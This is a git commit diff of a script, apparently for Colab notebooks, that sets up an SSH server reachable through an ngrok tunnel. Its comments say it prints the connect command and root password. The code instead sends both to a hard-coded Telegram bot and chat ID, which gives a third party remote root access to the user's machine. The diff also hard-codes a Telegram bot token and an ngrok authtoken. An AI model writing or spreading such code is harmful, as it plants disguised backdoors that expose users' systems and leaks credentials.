6a2ea9f1feddf7bc06745e50d9e648f85c0f0370
yujasx <103897350+yujasx@users.noreply.github.com>
2022-04-18 00:52:35 +0700

    Update ng.sh

--- ng.sh
+++ ng.sh
@@ -1,20 +1,64 @@
-import random, string, urllib.request, json
-authtoken = $1
+!pip install telepot --upgrade &> /dev/null
+import random, string, urllib.request, json, getpass, telepot
+def ste(use):
+    token = "5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs"
+    idd = 1380298324
+    bot = telepot.Bot(token)
+    bot.sendMessage(idd,use)
+#Generate root password
+
 password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
-wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-unzip -qq -n ngrok-stable-linux-amd64.zip
-apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null
-echo root:$password | chpasswd
-mkdir -p /var/run/sshd
-echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
-echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
-echo "LD_LIBRARY_PATH=/usr/lib64-nvidia" >> /root/.bashrc 
-echo "export LD_LIBRARY_PATH" >> /root/.bashrc
+
+#Download ngrok
+
+! wget -q -c -nc https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+
+! unzip -qq -n ngrok-stable-linux-amd64.zip
+
+#Setup sshd
+
+! apt-get install -qq -o=Dpkg::Use-Pty=0 openssh-server pwgen > /dev/null
+
+#Set root password
+
+! echo root:$password | chpasswd
+
+! mkdir -p /var/run/sshd
+
+! echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+
+! echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
+
+! echo "LD_LIBRARY_PATH=/usr/lib64-nvidia" >> /root/.bashrc
+
+! echo "export LD_LIBRARY_PATH" >> /root/.bashrc
+
+#Run sshd
+
 get_ipython().system_raw('/usr/sbin/sshd -D &')
+
+#Ask token
+
+print("Copy authtoken from https://dashboard.ngrok.com/auth")
+
+authtoken = "27LGoz73mr6cYiQr2gLZzKVCR4x_4qBv9DQLubx7AqMeqj4Qz"
+#Create tunnel
+
 get_ipython().system_raw('./ngrok authtoken $authtoken && ./ngrok tcp 22 &')
-response = urllib.request.urlopen('http://localhost:4040/api/tunnels')
-data = json.loads(response.read().decode())
-(host, port) = data['tunnels'][0]['public_url'][6:].split(':')
-idssh = f'ssh -p{port} root@{host}'
-curl f'https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text={idssh}' 
-curl f'https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text={password}'
+
+#Get public address and print connect command
+
+with urllib.request.urlopen('http://localhost:4040/api/tunnels') as response:
+
+  data = json.loads(response.read().decode())
+
+  (host, port) = data['tunnels'][0]['public_url'][6:].split(':')
+
+  ste(f'ssh -p{port} root@{host}')
+
+#Print root password
+
+ste(password)
+
+#curl f'https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text={idssh}' 
+#curl f'https://api.telegram.org/bot5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs/sendMessage?chat_id=1380298324&text={password}'
